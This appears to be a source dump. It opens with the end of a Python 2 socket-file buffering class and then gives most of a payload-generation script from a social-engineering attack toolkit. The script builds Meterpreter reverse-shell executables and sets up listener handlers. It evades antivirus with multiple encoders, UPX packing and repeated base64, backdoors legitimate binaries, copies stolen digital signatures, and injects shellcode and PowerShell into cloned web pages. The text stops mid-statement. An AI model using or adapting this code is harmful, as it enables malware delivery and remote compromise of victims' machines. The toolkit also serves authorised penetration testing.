            self._wbufsize == 1 and '\n' in data or
            self._wbuf_len >= self._wbufsize):
            self.flush()

    def writelines(self, list):
        # XXX We could do better here for very long lists
        # XXX Should really reject non-string non-buffers
        lines = filter(None, map(str, list))
        self._wbuf_len += sum(map(len, lines))
        self._wbuf.extend(lines)
        if (self._wbufsize <= 1 or
            self._wbuf_len >= self._wbufsize):
            self.flush()

    def read(self, size=-1):
        # Use max, disallow tiny reads in a loop as they are very inefficient.
        # We never leave read() with any leftover data from a new recv() call
        # in our internal buffer.
        rbufsize = max(self._rbufsize, self.default_bufsize)
        # Our use of StringIO rather than lists of string objects returned by
        # recv() minimizes memory usage and fragmentation that occurs when
        # rbufsize is large compared to the typical return value of recv().
        buf = self._rbuf
        buf.seek(0, 2)  # seek end
        if size < 0:
            # Read until EOF
            self._rbuf = StringIO()  # reset _rbuf.  we consume it via buf.
            while True:
                try:
                    data = self._sock.recv(rbufsize)
                except error, e:
                    if e.args[0] == EINTR:
                        continue
                    raise
                if not data:
                    break
                buf.write(data)
            return buf.getvalue()
        else:
            # Read until size bytes or EOF seen, whichever comes first
            buf_len = buf.tell()
            if buf_len >= size:
                # Already have size bytes in our buffer?  Extract and return.
                buf.seek(0)
                rv = buf.read(size)
                self._rbuf = StringIO()
                self._rbuf.write(buf.read())
                return rv

            self._rbuf = StringIO()  # reset _rbuf.  we consume it via buf.
            while True:
                left = size - buf_len
                # recv() will malloc the amount of memory given as its
                # parameter even though it often returns much less data
                # than that.  The returned data string is short lived
                # as we copy it into a StringIO and free it.  This avoids
                # fragmentation issues on many platforms.
                try:
                    data = self._sock.recv(left)
                except error, e:
                    if e.args[0] == EINTR:
                        continue
                    raise
                if not data:
                    break
                n = len(data)
                if n == size and not buf_len:
                    # Shortcut.  Avoid buffer data copies when:
                    # - We have no data in our buffer.
                    # AND
                    # - Our call to recv returned exactly the
                    #   number of bytes we were asked to read.
                    return data
                if n == left:
                    buf.write(data)
                    del data  # explicit free
                    break
                assert n <= left, "recv(%d) returned %d bytes" % (left, n)
                buf.write(data)
                buf_len += n
                del data  # explicit free
                #assert buf_len == buf.tell()
            return buf.getvalue()

    def readline(self, size=-1):
        buf = self._rbuf
        buf.seek(0, 2)  # seek end
        if buf.tell() > 0:
            # check if we already have it in our buffer
            buf.seek(0)
            bline = buf.readline(size)
            if bline.endswith('\n') or len(bline) == size:
                self._rbuf = StringIO()
                self._rbuf.write(buf.read())
                return bline
            del bline
        if size < 0:
            # Read until \n or EOF, whichever comes first
            if self._rbufsize <= 1:
                # Speed up unbuffered case
                buf.seek(0)
                buffers = [buf.read()]
                self._rbuf = StringIO()  # reset _rbuf.  we consume it via buf.
                data = None
                recv = self._sock.recv
                while True:
                    try:
                        while data != "\n":
                            data = recv(1)
                            if not data:
                                break
                            buffers.append(data)
                    except error, e:
                        # The try..except to catch EINTR was moved outside the
                        # recv loop to avoid the per byte overhead.
                        if e.args[0] == EINTR:
                            continue
                        raise
                    break
                return "".join(buffers)

            buf.seek(0, 2)  # seek end
            self._rbuf = StringIO()  # reset _rbuf.  we consume it via buf.
            while True:
                try:
                    data = self._sock.recv(self._rbufsize)
                except error, e:
                    if e.args[0] == EINTR:
                        continue
                    raise
                if not data:
                    break
                nl = data.find('\n')
                if nl >= 0:
                    nl += 1
                    buf.write(data[:nl])
                    self._rbuf.write(data[nl:])
                    del data
                    break
                buf.write(data)
            return buf.getvalue()
        else:
            # Read until size bytes or \n or EOF seen, whichever comes first
            buf.seek(0, 2)  # seek end
            buf_len = buf.tell()
            if buf_len >= size:
                buf.seek(0)
                rv = buf.read(size)
                self._rbuf = StringIO()
                self._rbuf.write(buf.read())
                return rv
            self._rbuf = StringIO()  # reset _rbuf.  we consume it via buf.
            while True:
                data = ""
                try:
                    data = self._sock.recv(self._rbufsize)
                except:
                    #if e.args[0] == EINTR:
                     #   continue
                    #raise
                    pass
                if not data:
                    break
                left = size - buf_len
                # did we just receive a newline?
                nl = data.find('\n', 0, left)
                if nl >= 0:
                    nl += 1
                    # save the excess data to _rbuf
                    self._rbuf.write(data[nl:])
                    if buf_len:
                        buf.write(data[:nl])
                        break
                    else:
                        # Shortcut.  Avoid data copy through buf when returning
                        # a substring of our first recv().
                        return data[:nl]
                n = len(data)
                if n == size and not buf_len:
                    # Shortcut.  Avoid data copy through buf when
                    # returning exactly all of our first recv().
                    return data
                if n >= left:
                    buf.write(data[:left])
                    self._rbuf.write(data[left:])
                    break
                buf.write(data)
                buf_len += n
                #assert buf_len == buf.tell()
            return buf.getvalue()

    def readlines(self, sizehint=0):
        total = 0
        list = []
        while True:
            line = self.readline()
            if not line:
                break
            list.append(line)
            total += len(line)
            if sizehint and total >= sizehint:
                break
        return list

    # Iterator protocols

    def __iter__(self):
        return self

    def next(self):
        line = self.readline()
        if not line:
            raise StopIteration
        return line

_GLOBAL_DEFAULT_TIMEOUT = object()

def create_connection(address, timeout=_GLOBAL_DEFAULT_TIMEOUT,
                      source_address=None):
    """Connect to *address* and return the socket object.

    Convenience function.  Connect to *address* (a 2-tuple ``(host,
    port)``) and return the socket object.  Passing the optional
    *timeout* parameter will set the timeout on the socket instance
    before attempting to connect.  If no *timeout* is supplied, the
    global default timeout setting returned by :func:`getdefaulttimeout`
    is used.  If *source_address* is set it must be a tuple of (host, port)
    for the socket to bind as a source address before making the connection.
    An host of '' or port 0 tells the OS to use the default.
    """

    host, port = address
    err = None
    for res in getaddrinfo(host, port, 0, SOCK_STREAM):
        af, socktype, proto, canonname, sa = res
        sock = None
        try:
            sock = socket(af, socktype, proto)
            if timeout is not _GLOBAL_DEFAULT_TIMEOUT:
                sock.settimeout(timeout)
            if source_address:
                sock.bind(source_address)
            sock.connect(sa)
            return sock

        except error as _:
            err = _
            if sock is not None:
                sock.close()

    if err is not None:
        raise err
    else:
        raise error("getaddrinfo returns an empty list")

########NEW FILE########
__FILENAME__ = create_payloads
#!/usr/bin/env python
## Import modules
import subprocess
import time
import sys
import os
import re
import socket
import base64
from src.core.setcore import *
from src.core.menu.text import *
from src.core.dictionaries import *

try:
    if len(check_options("IPADDR=")) > 2:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = ""
except: 
    ipaddr = ""

me = mod_name()
listener="notdefined"
definepath=os.getcwd()
sys.path.append(definepath)
port1 = "8080"
port2 = "8081"
operating_system = check_os()

# check stage encoding - shikata ga nai for payload delivery
stage_encoding = check_config("STAGE_ENCODING=").lower()
if stage_encoding == "off": stage_encoding = "false"
else: stage_encoding = "true"

# grab configuration options
encount="4"

configfile=file("%s/config/set_config" % (definepath),"r").readlines()

# check the metasploit path
msf_path = meta_path()

# check the config files for all of the flags needed for the file
encount=check_config("ENCOUNT=")
auto_migrate=check_config("AUTO_MIGRATE=")
digital_steal=check_config("DIGITAL_SIGNATURE_STEAL=")
meterpreter_multi = check_config("METERPRETER_MULTI_SCRIPT=")
linux_meterpreter_multi=check_config("LINUX_METERPRETER_MULTI_SCRIPT=")
meterpreter_multi_command=check_config("METERPRETER_MULTI_COMMANDS=")
meterpreter_multi_command = meterpreter_multi_command.replace(";", "\n")
linux_meterpreter_multi_command = check_config("LINUX_METERPRETER_MULTI_COMMANDS=")
linux_meterpreter_multi_command = linux_meterpreter_multi_command.replace(";", "\n")
upx_encode = check_config("UPX_ENCODE=")
upx_path = check_config("UPX_PATH=")
if operating_system != "windows":
    if not os.path.isfile(upx_path):
        print_error("ERROR: UPX packer was not found. Disabling UPX packing.")
        upx_encode = "OFF"
unc_embed = check_config("UNC_EMBED=")

# add the digital signature stealing
if digital_steal == "ON":
    try:
        debug_msg(me,"importing Python module 'pefile'",1)
        try: reload(pefile)
        except: import pefile
        sys.path.append("src/core/digitalsig/")
        debug_msg(me,"importing 'src.core.digitalsig.disitool'",1)
        try: reload(disitool)
        except: import disitool

    except ImportError:
        if operating_system != "windows":
            print_error("Error:PEFile not detected. You must download it from http://code.google.com/p/pefile/")
            print_warning("Turning the digital signature stealing flag off... A/V Detection rates may be lower.")
        digital_steal = "OFF"

attack_vector=0
linosx=0
multiattack=""
# grab attack vector
if os.path.isfile(setdir + "/attack_vector"):
    fileopen=file(setdir + "/attack_vector", "r")
    for line in fileopen:
        line=line.rstrip()
        if line == "java":
            attack_vector="java"
        if line == "multiattack":
            attack_vector="multiattack"
            multiattack=file(setdir + "/multi_payload","w")

# here is a place holder for the multi attack java
# multiattack outputs a file called multi_java if
# this file is present it will allow additional
# functionality
multiattack_java="off"
if os.path.isfile(setdir + "/multi_java"):
    multiattack_java="on"

# grab binary path if needed
fileopen=file("config/set_config", "r")
for line in fileopen:
    match=re.search("CUSTOM_EXE=", line)
    if match:
        line=line.rstrip()
        line=line.replace("CUSTOM_EXE=", "")
        custom_exe=line
        if custom_exe == "legit.binary": custom_exe="src/payloads/exe/legit.binary"

# custom payloadgen
payloadgen="regular"
if os.path.isfile(setdir + "/payloadgen"):
    payloadgen="solo"

# set ipquestion to blank until otherwise pulled
ipquestion=""

####################################################################################################################################
# grab ipaddr if it hasn't been identified yet
####################################################################################################################################


if check_options("IPADDR=") == False:
    fileopen=file("config/set_config", "r")
    data = fileopen.read()
    match = re.search("AUTO_DETECT=ON", line)
    if match:
        try:
            ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ipaddr.connect(('google.com', 0))
            ipaddr.settimeout(2)
            ipaddr=ipaddr.getsockname()[0]
            update_options("IPADDR=" + ipaddr)

        except Exception,e:
            log(e)
            ipaddr=raw_input(setprompt(["4"], "IP address for the payload listener"))
            update_options("IPADDR=" + ipaddr)

    # if AUTO_DETECT=OFF prompt for IP Address
    match=re.search("AUTO_DETECT=OFF", data)
    if match:
		ipaddr=raw_input(setprompt(["4"], "Enter the IP address for the payload (reverse)"))
		update_options("IPADDR=" + ipaddr)

# payload selection here
try:

    # Specify path to metasploit
    path=msf_path
    # Specify payload

    # this is encoding
    encode=""
    # this is payload
    choice1=""
    # this is port
    choice3=""
    if os.path.isfile(setdir + "/meterpreter_reverse_tcp_exe"):
        fileopen=file(setdir + "/meterpreter_reverse_tcp_exe", "r")
        for line in fileopen:
        # this reads in the first line of the file which happens to be port
        # when calling through core
            choice3=line.rstrip()
            # change attack_vector to nothing
            attack_vector=""

        # specify payload
        choice1="windows/meterpreter/reverse_tcp"
        # encode using backdoored executable
        encode="16"

    # if we don't trigger on the standard core api call
    if choice1 == "":
        ###################################################
        #        USER INPUT: SHOW PAYLOAD MENU 1          #
        ###################################################
        debug_msg(me,"printing 'text.payload_menu_1'",5)
        show_payload_menu1 = create_menu(payload_menu_1_text, payload_menu_1)
        choice1 = raw_input(setprompt(["4"], ""))

    if operating_system == "windows" or msf_path == False:
        # default blank then select SETSHELL
        if choice1 == "":
            choice1 = "11"
        # if we specify choice 1, thats SETSHELL
        if choice1 == "1":
            choice1 == "11"
        # if we specify choice 2, thats the SET reverse http shell
        if choice1 == "2":
            choice1 = "12"
        # selecting ratte
        if choice1 == "3":
            choice1 = "13"

        # if they specified something else that wasn't there just default to SETSHELL
        else: choice1 = "11"
    # check the length and make sure it works
    if choice1 != "":
        choice1 = check_length(choice1,17)
        # convert it to a string
        choice1 = str(choice1)
    custom=0
    counter=0
    flag=0
    encode_stop=0

    # Condition testing of 'choice1'
    # Will use a dictionary list

    if choice1 == "exit":
        exit_set()

    if choice1 == '':
        choice1 = ("11")

    if choice1 == '5' or choice1 == '6' or choice1 == '7':
        encode_stop = 1
        encode = ""

    if choice1 == '8':
        flag = 1

    # here we specify shellcodeexec
    if choice1 == '14' or choice1 == '15' or choice1 == '16':
        encode_stop = 1
        encode = 0

    # 11 is the set interactive shell, 12 is set rev http shell and 13 is ratte listener
    if choice1 == '11' or choice1 == '12' or choice1 == "13":
        encoder = 'false'
        payloadgen = 'solo'
        encode_stop = 1
        filewrite = file(setdir + "/set.payload", "w")
        # select setshell
        if choice1 == '11':
            filewrite.write("SETSHELL")
        # select setshell_reverse
        if choice1 == '12':
            filewrite.write("SETSHELL_HTTP")
        # select ratte
        if choice1 == '13':
            filewrite.write("RATTE")
        filewrite.close()

    if choice1 != "17":
        # if not then import the payload selection
        choice1 = ms_payload_2(choice1)

    # don't do courtesy shell
    if counter==0:
        courtesyshell=("")

    # if custom
    if choice1=='17':
        print_info("Example: /root/custom.exe")
        choice1=raw_input(setprompt(["4"], "Enter the path to your executable"))
        if not os.path.isfile(choice1):
            while 1:
                print_error("ERROR:File not found. Try Again.")
                choice1=raw_input(setprompt(["4"], "Enter the path to your executable"))
                if os.path.isfile(choice1):
                    break
        update_options("CUSTOM_EXE=%s" % (choice1))
        custom=1

    # if we are using our own executable
    if custom == 1:
        check_write=file(setdir + "/custom.exe", "w")
        check_write.write("VALID")
        check_write.close()
        shutil.copyfile("%s" % (choice1), "msf.exe")
        shutil.copyfile("msf.exe", setdir + "/msf.exe")

    # Specify Encoding Option
    encoder="false"

    # if we aren't using the set shell
    if choice1 != "set/reverse_shell":
        # we need to rewrite index.html real quick because it has a parameter that could get confusing
        if os.path.isfile(setdir + "/web_clone/index.html"):
            fileopen = file(setdir + "/web_clone/index.html" ,"r")
            data = fileopen.read()
            data = data.replace("freehugs", "")
            os.remove(setdir + "/web_clone/index.html")
            filewrite=file(setdir + "/web_clone/index.html", "w")
            filewrite.write(data)
            filewrite.close()



    if custom == 0:
        if encode_stop == 0 and encode != "16" and choice1 != "set/reverse_shell":
            ###################################################
            #        USER INPUT: SHOW ENCODER MENU            #
            ###################################################
            debug_msg (me,"printing 'text.encoder_menu'",5)
            show_encoder_menu = create_menu(encoder_text, encoder_menu)
            encode = raw_input(setprompt(["18"], ""))

            encoder="true"

            if encode == 'exit':
                exit_set()

            # turn off some options if fasttrack is in use
            if os.path.isfile(setdir + "/fasttrack.options"):
                upx_encode == "OFF"
                encode = "2"
                encoder = "true"

            # Handle special cases
            if encode=='' or encode == ' ': encode = '1'
            if encode == '1':
                encount="4"
            if encode=='14' or encode == '0': encoder="false"

            # do dictionary lookup
            encode1 = encoder_type(encode)
            encode = "x86/" + encode1
            if encode == "x86/MULTIENCODE" or encode == "x86/BACKDOOR":
                encode = encode.replace("x86/", "")

        # Specify Remote Host if ipaddr.file is missing (should never get here)
        if check_options("IPADDR=") == 0:
            choice2=raw_input(setprompt(["4"], "IP Address of the listener/attacker (reverse) or host/victim (bind shell)"))
            update_options("IPADDR=" + choice2)

        choice2 = check_options("IPADDR=")

        # grab interface ip address
        if os.path.isfile(setdir + "/interface"):
            fileopen=file(setdir + "/interface", "r").readlines()
            for line in fileopen:
                line=line.rstrip()
                ipquestion=line

        # specify the port for the listener
        if choice3 == "":
            if choice1 != "shellcode/multipyinject":
                choice3=raw_input(setprompt(["4"], "PORT of the listener [443]"))

        # here we check if the user really wants to use port 80
        if choice3 == "80":
            print_warning("WARNING: SET Web Server requires port 80 to listen.")
            print_warning("WARNING: Are you sure you want to proceed with port 80?")
            port_choice_option = raw_input("\nDo you want to keep port 80? [y/n]")
            if port_choice_option == "n":
                # reprompt it
                choice3=raw_input(setprompt(["4"], "PORT of listener [443]"))

        if choice3 == '': choice3 = '443'
        # this is needed for the set_payload
        update_options("PORT=" + choice3)

        # if we are using the SET interactive shell then do this
        if choice1 == "set/reverse_shell":
            encoder = "false"
            filewrite=file(setdir + "/set.payload.posix", "w")
            filewrite.write("true")
            filewrite.close()
            import src.core.payloadprep

        # if were using the multiattack option
        if attack_vector == "multiattack":
            multiattack.write("MAIN="+str(choice3)+"\n")
            multiattack.write("MAINPAYLOAD="+str(choice1)+"\n")

        # if encoding is required, it will place 1msf.exe first then encode it to msf.exe
        if encoder == "true":
            choice4=("R")
            msf_filename=("1msf.exe")
        if encoder == "false":
            choice4=("X")
            msf_filename=("msf.exe")

        # set choice to blank for ALL PORTS scan
        if flag == 0:
            portnum="LPORT="+choice3
        if flag == 1:
            portnum=""

        if encode != "BACKDOOR":
            # if we aren't using the set reverse shell
            if choice1 != "set/reverse_shell":
                # if we aren't using shellcodeexec
                if choice1 != "shellcode/alphanum":
                    if choice1 != "shellcode/pyinject":
                        if choice1 != "shellcode/multipyinject":
                            generatepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s > %s/%s" % (path,choice1,choice2,portnum,courtesyshell,choice4,setdir,msf_filename), shell=True).wait()
                # if we are using shellcodeexec
                if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                    if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject":
                        print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n")
                        # select payload
                        choice9 = raw_input(setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
                        # select default meterpreter reverse tcp
                        if choice9 == "" or choice9 == "1":
                            choice9 = "windows/meterpreter/reverse_tcp"
                        # select reverse https
                        if choice9 == "2":
                            choice9 = "windows/meterpreter/reverse_https"
                        # select reverse http
                        if choice9 == "3":
                            choice9 = "windows/meterpreter/reverse_http"
                        # select all ports
                        if choice9 == "4":
                            choice9 = "windows/meterpreter/reverse_tcp_allports"

                        if ipaddr == "":
                            # grab ipaddr if not defined
                            ipaddr = check_options("IPADDR=")

                    if choice1 == "shellcode/alphanum":
                        print_status("Generating the payload via msfpayload and generating alphanumeric shellcode...")
                        subprocess.Popen("ruby %s/msfpayload %s LHOST=%s %s EXITFUNC=thread R > %s/meterpreter.raw" % (path,choice9,choice2,portnum,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                        subprocess.Popen("ruby %s/msfencode -e x86/alpha_mixed -i %s/meterpreter.raw -t raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (path,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

                    if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                        # here we update set options to specify pyinjection and multipy
                        update_options("PYINJECTION=ON")
                    # define, this will eventually be all of our payloads
                        multipyinject_payload = ""
                        # clean up old file
                        if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
                            os.remove("%s/meta_config_multipyinjector" % (setdir))

                        # remove any old payload options
                        if os.path.isfile(setdir + "/payload.options.shellcode"): os.remove(setdir + "/payload_options.shellcode")
                        # this is the file that gets saved with the payload and port options
                        payload_options = file(setdir + "/payload_options.shellcode", "a")
                        
                        while 1:
                                                
                            if choice1 == "shellcode/multipyinject":
                                print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
                                choice9 = raw_input(setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
                                # select default meterpreter reverse tcp
                                if choice9 == "" or choice9 == "1": choice9 = "windows/meterpreter/reverse_tcp"
                                # select reverse https
                                if choice9 == "2": choice9 = "windows/meterpreter/reverse_https"
                                # select reverse http
                                if choice9 == "3": choice9 = "windows/meterpreter/reverse_http"
                                # select all ports
                                if choice9 == "4": choice9 = "windows/meterpreter/reverse_tcp_allports"
                                if choice9 == "5": choice9 = "windows/shell/reverse_tcp"
                                # check the ipaddr
                                if ipaddr == "":
                                    # grab ipaddr if not defined
                                    ipaddr = check_options("IPADDR=")
                                # break out if not needed
                                if choice9 == "6": break

                                shellcode_port = raw_input(setprompt(["4"], "Enter the port number [443]"))
                                if shellcode_port == "": shellcode_port = "443"

                                # here we prep our meta config to listen on all the ports we want - free hugs all around
                                filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                                port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
                                if port_check == False:
                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (choice9, stage_encoding,ipaddr, shellcode_port))
                                    filewrite.close()

                            if validate_ip(choice2) == False:
                                if choice9 != "windows/meterpreter/reverse_https":
                                    if choice9 != "windows/meterpreter/reverse_http":
                                        print_status("Possible hostname detected, switching to windows/meterpreter/reverse_https")
                                        choice9 == "windows/meterpreter/reverse_https"

                            if choice9 == "windows/meterpreter/reverse_tcp_allports": 
                                portnum = "LPORT=1"

                            # fix port num
                            if "multipyinject" in choice1:
                                portnum = shellcode_port

                            else: portnum = portnum.replace("LPORT=", "")

                            # meterpreter reverse_tcp
                            if choice9 == "windows/meterpreter/reverse_tcp": 
                                shellcode = metasploit_shellcode(choice9, choice2, portnum)
                            # meterpreter reverse_https
                            if choice9 == "windows/meterpreter/reverse_https": 
                                shellcode = metasploit_shellcode(choice9, choice2,portnum)
                            # meterpreter reverse_http
                            if choice9 == "windows/meterpreter/reverse_http": 
                                shellcode = metasploit_shellcode(choice9, choice2,portnum)
                            # meterpreter tcp allports
                            if choice9 == "windows/meterpreter/reverse_tcp_allports": 
                                shellcode = metasploit_shellcode(choice9, choice2,portnum)
                            # windows shell reverse_tcp
                            if choice9 == "windows/shell/reverse_tcp": 
                                shellcode = metasploit_shellcode(choice9, choice2, portnum)

                            if choice1 == "shellcode/pyinject":
                                shellcode_port = portnum.replace("LPORT=", "")

                            if validate_ip(choice2) == True:
                                shellcode = shellcode_replace(choice2, shellcode_port, shellcode)

                            # here we write out the payload and port for later use in powershell injection
                            payload_options.write(choice9 + " " + portnum + ",")

                            # break out of the loop if we are only using one payload else keep on
                            if choice1 == "shellcode/pyinject": break
                            multipyinject_payload += shellcode + ","
                        
                        
                        # get rid of tail comma
                        if multipyinject_payload.endswith(","):
                            multipyinject_payload = multipyinject_payload[:-1]

                        # if we have multiple payloads, use multi injector
                        if choice1 == "shellcode/multipyinject":
                            # we first need to encrypt the payload via AES 256
                            print_status("Encrypting the shellcode via 256 AES encryption..")
                            secret = os.urandom(32)
                            shellcode = encryptAES(secret, multipyinject_payload)
                            print_status("Dynamic cipher key created and embedded into payload.")
                        filewrite = file("%s/meterpreter.alpha_decoded" % (setdir), "w")
                        filewrite.write(shellcode)
                        filewrite.close()
                    if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                    

                        # close the pyinjector file for ports and payload
                        payload_options.close()

                    # here we are going to encode the payload via base64
                    fileopen = file("%s/meterpreter.alpha_decoded" % (setdir), "r")
                    data = fileopen.read()
                    if payloadgen != "solo":
                        # base64 1
                        data = base64.b64encode(data)
                        # encode it again for the fun 2
                        data = base64.b64encode(data)
                        # again 3
                        data = base64.b64encode(data)
                        # again 4
                        data = base64.b64encode(data)
                        # again 5
                        data = base64.b64encode(data)
                        # again 6
                        data = base64.b64encode(data)
                        # again 7
                        data = base64.b64encode(data)
                        # again 8
                        data = base64.b64encode(data)
                        # 9
                        data = base64.b64encode(data)
                        # 10
                        data = base64.b64encode(data)
                        # last one
                        data = base64.b64encode(data)
                        #
                    filewrite = file("%s/meterpreter.alpha" % (setdir), "w")
                    filewrite.write(data)
                    filewrite.close()
                    if choice1 == "shellcode/alphanum":
                        print_status("Prepping shellcodeexec for delivery..")
                    if choice1 == "shellcode/pyinject":
                        print_status("Prepping pyInjector for delivery..")
                    # prepping multi pyinjector
                    if choice1 == "shellcode/multipyinject":
                        print_status("Prepping Multi-pyInjector for delivery..")
                    # here we obfuscate the binary a little bit
                    random_string = generate_random_string(3,3).upper()
                    if choice1 == "shellcode/alphanum":
                        fileopen = file("%s/src/payloads/exe/shellcodeexec.binary" % (definepath), "rb")
                    if choice1 == "shellcode/pyinject":
                        fileopen = file("%s/src/payloads/set_payloads/pyinjector.binary" % (definepath), "rb")
                    if choice1 == "shellcode/multipyinject":
                        fileopen = file("%s/src/payloads/set_payloads/multi_pyinjector.binary" % (definepath), "rb")

                    filewrite = file("%s/shellcodeexec.custom" % (setdir), "wb")
                    data = fileopen.read()
                    filewrite.write(data.replace("UPX", random_string, 4))
                    filewrite.close()
                    subprocess.Popen("cp %s/shellcodeexec.custom %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                    # we need to read in the old index.html file because its already generated, need to present the alphanum to it
                    if os.path.isfile("%s/web_clone/index.html" % (setdir)):
                        fileopen = file("%s/web_clone/index.html" % (setdir), "r")
                        filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
                        fileopen2 = file("%s/meterpreter.alpha" % (setdir), "r")
                        alpha_shellcode = fileopen2.read().rstrip()
                        data = fileopen.read()
                        data = data.replace('param name="2" value=""', 'param name="2" value="%s"' % (alpha_shellcode))
                        if choice1 == "shellcode/multipyinject":
                            secret = base64.b64encode(secret)
                            data = data.replace('param name="10" value=""', 'param name="10" value ="%s"' % (secret))
                        filewrite.write(data)

                        # close file
                        filewrite.close()

                        # rename file
                        if choice1 == "shellcode/alphanum":
                            print_status("Prepping website for alphanumeric injection..")
                        if choice1 == "shellcode/pyinject":
                            print_status("Prepping website for pyInjector shellcode injection..")
                        print_status("Base64 encoding shellcode and prepping for delivery..")
                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                    if choice9 == "windows/meterpreter/reverse_tcp_allports":
                        portnum = "LPORT=1"
                        choice3 = "1"

                        # UPDATE THE SET CONFIG OPTIONS
                        update_options("PORT=1")

                    # here we specify the payload name thats stored later on
                    choice1 = choice9

        # write out the payload for powershell injection to pick it up if used
        filewrite = file(setdir + "/metasploit.payload", "w")
        filewrite.write(choice1)
        filewrite.close()
        # import if on
        setshell_counter = 0
        powershell = check_config("POWERSHELL_INJECTION=")
        if powershell.lower() == "on" or powershell.lower() == "yes":
            if choice1 == "set/reverse_shell" or choice1 == "RATTE":
                print_status("Please note that the SETSHELL and RATTE are not compatible with the powershell injection technique. Disabling the powershell attack.")
                setshell_counter = 1
            if setshell_counter == 0:
                if os.path.isfile("%s/web_clone/index.html" % (setdir)):
                    try: reload(src.payloads.powershell.prep)
                    except: import src.payloads.powershell.prep
                    if os.path.isfile("%s/x86.powershell" % (setdir)):
                        fileopen1 = file("%s/x86.powershell" % (setdir), "r")
                        x86 = fileopen1.read()
                        # open up the x86 powershell attack
                        fileopen3 = fileopen = file("%s/web_clone/index.html" % (setdir), "r")
                        filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
                        data = fileopen3.read()
                        data = data.replace('param name="5" value=""', 'param name="5" value="%s"' % (x86))
                        data = data.replace('param name="6" value=""', 'param name="6" value="%s"' % (x86))
                        # check if we don't want to deploy binaries
                        deploy_binaries = check_config("DEPLOY_BINARIES=")
                        if deploy_binaries.lower() == "n" or deploy_binaries.lower() == "no":
                            data = data.replace('param name="8" value="YES"', 'param name="8" value="NO"')
                        filewrite.write(data)
                        filewrite.close()
                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (setdir,setdir), stdout=subprocess.PIPE, shell=True)

        if encoder ==  "true":
            # If not option 16 or default then go here
            if encode != "MULTIENCODE":
                if encode != "BACKDOOR":
                    print_info("Encoding the payload %s times. [-]\n" % (str(encount)))
                    encodepayload=subprocess.Popen(r"ruby %s/msfencode < %s/1msf.exe -e %s -o %s/msf.exe -t exe -c %s" % (path,setdir,encode,setdir,encount), shell=True).wait()

            # If option 16 or default then go here
            if encode == "MULTIENCODE":
                print_info("Encoding the payload multiple times to get around pesky Anti-Virus.")
                encodepayload=subprocess.Popen(r"ruby %s/msfencode -e x86/shikata_ga_nai -i %s/1msf.exe -t raw -c 5 | ruby %s/msfencode -t raw -e x86/alpha_upper -c 2 | ruby %s/msfencode -t raw -e x86/shikata_ga_nai -c 5 | ruby %s/msfencode -t exe -c 5 -e x86/countdown -o %s/msf.exe" % (path,setdir,path,path,path,setdir), shell=True).wait()
                encode1=("x86/countdown")

            # If option 16, backdoor executable better AV avoidance
            if encode == "BACKDOOR":
                print_info("Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...")
                backdoor_execution = check_config("BACKDOOR_EXECUTION=").lower()
                if backdoor_execution == "on": backdoor_execution = "-k"
                if backdoor_execution != "on": backdoor_execution = ""
                subprocess.Popen("cp %s %s/legit.exe 1> /dev/null 2> /dev/null" % (custom_exe,setdir), shell=True).wait()
                encodepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s | ruby %s/msfencode  -c 10 -e x86/shikata_ga_nai -x %s/legit.exe -o %s/msf.exe -t exe %s 1> /dev/null 2>/dev/null" % (path,choice1,choice2,portnum,courtesyshell,choice4,path,setdir,setdir,backdoor_execution), shell=True).wait()
                print_status("Backdoor completed successfully. Payload is now hidden within a legit executable.")


                # define to use UPX or not
                if upx_encode == "ON":
                    if choice1 != "set/reverse_shell":
                        print_status("UPX Encoding is set to ON, attempting to pack the executable with UPX encoding.")
                        upx("%s/msf.exe" % (setdir))

                # define to use digital signature stealing or not
                if digital_steal == "ON":
                    print_status("Digital Signature Stealing is ON, hijacking a legit digital certificate")
                    disitool.CopyDigitalSignature("src/core/digitalsig/digital.signature", setdir + "/msf.exe", setdir + "/msf2.exe")
                    subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                    subprocess.Popen("cp %s/msf2.exe %s/msf.exe" % (setdir,setdir), shell=True).wait()
                encode1=("x86/shikata_ga_nai")

        if choice1 == 'windows/shell_bind_tcp' or choice1 == 'windows/x64/shell_bind_tcp' :
